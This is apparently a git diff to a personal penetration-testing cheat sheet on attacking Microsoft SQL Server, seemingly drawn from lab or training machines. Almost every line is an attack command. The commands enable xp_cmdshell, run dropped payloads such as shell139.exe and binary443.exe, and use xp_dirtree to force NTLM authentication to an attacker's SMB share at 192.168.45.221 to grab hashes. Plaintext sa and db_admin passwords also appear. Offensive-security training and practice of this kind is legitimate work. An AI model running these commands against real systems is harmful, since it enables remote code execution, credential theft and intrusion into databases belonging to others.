@@ -2,6 +2,12 @@
 
 ##### Enumeration
 
+TEST DEFAULT CREDENTIALS.
+Invoke-SQLDumpInfo -Verbose
+Invoke-SQLAudit -Verbose -Instance SQLServer1
+sqlcmd.exe -S nagoya.nagoya-industries.com -U administrator -Q "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
+sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com
 ````
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
 ````
@@ -46,7 +52,7 @@ xp_cmdshell whoami
 enable_xp_cmdshell
 
 # set up smb share locally to grab hash
-xp_dirtree \\192.168.45.178\share\file
+xp_dirtree \\192.168.45.221\share\file
 ```
 
 ````
@@ -134,6 +140,7 @@ sqlcmd -U db_admin -P 'B1@hx31234567890' -Q "USE STREAMIO_BACKUP; select usernam
 
 ```bash
 sqlcmd -?
+sqlcmd -Q "select name from sys.databases"
 sqlcmd -Q "select * from sys.databases"
 sqlcmd -Q "select name from sys.databases"
 sqlcmd -Q "use umbraco; select * from umbraco..sysobjects"
@@ -150,6 +157,11 @@ If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".
 
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_cmdshell 'whoami'"
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'c:\Windows\Tasks\binary443.exe'"
-sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_dirtree '\\192.168.45.178\share\file'"
+sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_dirtree '\\192.168.45.221\share\file'"
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..cmsMember"
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..sysobjects"umbracoUserLogin umbracoUser umbracoUserGroup
+
+.\sqlcmd.exe -Q "exec xp_cmdshell 'whoami'"
+.\sqlcmd.exe -Q "use msdb; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'whoami'"
+sqlcmd -Q "use msdb; exec xp_cmdshell 'whoami'"
+sqlcmd.exe -Q "use msdb; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'C:\Users\Christopher.Lewis\Documents\shell139.exe'"
